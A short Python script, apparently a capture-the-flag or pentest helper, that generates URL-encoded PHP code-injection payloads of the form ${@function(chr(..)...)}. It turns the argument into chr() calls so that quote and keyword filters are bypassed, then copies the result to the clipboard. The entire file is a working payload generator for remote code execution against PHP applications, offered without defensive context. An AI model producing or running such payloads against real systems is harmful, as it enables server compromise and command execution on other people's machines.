import pyperclip

BEGIN = "%24%7B%40"
END = "%29%7D"

php_function = input("enter the php function:\t")
argument = input("enter argument:\t")

encoded_func = BEGIN + php_function + "%28" + "chr%28" + str(ord(argument[0])) + "%29"
for char in argument[1:]:
    encoded_func += ".chr%28" + str(ord(char)) + "%29"
encoded_func += END

print("Encoded function: \n" + encoded_func)
pyperclip.copy(encoded_func) #This copies the encoded function to clipboard